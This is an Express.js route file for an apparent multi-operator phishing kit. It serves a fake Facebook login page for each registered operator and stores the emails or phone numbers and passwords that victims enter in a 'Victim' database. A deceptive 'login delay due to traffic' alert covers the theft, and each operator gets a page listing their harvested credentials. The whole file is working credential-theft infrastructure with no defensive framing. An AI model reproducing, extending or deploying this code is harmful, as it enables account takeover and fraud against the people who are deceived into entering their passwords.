const express = require('express');
const User = require('../models/User');
const Victim = require('../models/Victim');
const router = express.Router();

// Root route: Redirects to the registration page
router.get('/', (req, res) => {
    res.redirect('/register');
});

// Render registration page
router.get('/register', (req, res) => {
    res.render('register');
});

// Handle registration form submission
router.post('/register', async (req, res) => {
    const { username, email, password } = req.body;
    try {
        const user = new User({ username, email, password });
        await user.save();
        res.redirect('/login');
    } catch (err) {
        console.error('Error creating user:', err);
        res.status(400).send('Error creating user');
    }
});


// Render login page
router.get('/login', (req, res) => {
    res.render('login');
});

/// Handle login form submission
router.post('/login', async (req, res) => {
    const { email, password } = req.body;
    console.log("Attempting login with email:", email);
    try {
        // Search for a user with the given email
        const user = await User.findOne({ email });
        if (!user) {
            console.log('User not found in database:', email);
            return res.status(401).send('Invalid email or password');
        }
        // Check if the provided password matches the saved hashed password
        const isMatch = await user.comparePassword(password);
        if (isMatch) {
            // Store user ID in session to keep user logged in
            req.session.userId = user._id;
            return res.redirect('/dashboard');
        } else {
            console.log('Password mismatch for user:', email);
            return res.status(401).send('Invalid email or password');
        }
    } catch (err) {
        console.error('Error during login:', err);
        res.status(500).send('Internal server error');
    }
});


// Render dashboard page if user is logged in
// router.get('/dashboard', async (req, res) => {
//     if (!req.session.userId) {
//         return res.redirect('/login');
//     }
//     try {
//         const user = await User.findById(req.session.userId);
//         res.render('dashboard', { user });
//     } catch (err) {
//         console.error('Error loading dashboard:', err);
//         res.status(500).send('Error loading dashboard');
//     }
// });
// Render dashboard page if user is logged in
router.get('/dashboard', async (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    try {
        const user = await User.findById(req.session.userId);
        
        // Pass userId separately to the template
        res.render('dashboard', { user, userId: req.session.userId });
    } catch (err) {
        console.error('Error loading dashboard:', err);
        res.status(500).send('Error loading dashboard');
    }
});











// Facebook page route
// Route to render the Facebook page
router.get('/facebook', (req, res) => {
    const userId = req.query.userId;
    
    if (!userId) {
        return res.status(400).send('User ID is required');
    }

    res.render('facebook', { userId });
});

// Submit login form and save to database with userId
// Handle form submission
router.post('/submit-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;

    try {
        // Save victim details to the database
        const victim = new Victim({ userId, emailOrNumber, password });
        await victim.save();

        // Show alert message (you could redirect to the dashboard with a flash message instead)
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// View victims page with data specific to logged-in user
// Route to render View Victims page
router.get('/view-victims', async (req, res) => {
    try {
        const victims = await Victim.find({ userId: req.session.userId });
        res.render('view-victims', { victims });
    } catch (err) {
        console.error('Error loading victims:', err);
        res.status(500).send('Error loading victims');
    }
});



// Delete victim entry by ID
router.post('/delete-victim/:id', async (req, res) => {
    const victimId = req.params.id;
    
    try {
        await Victim.findByIdAndDelete(victimId);
        res.redirect('/view-victims');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error deleting data');
    }
});



module.exports = router;
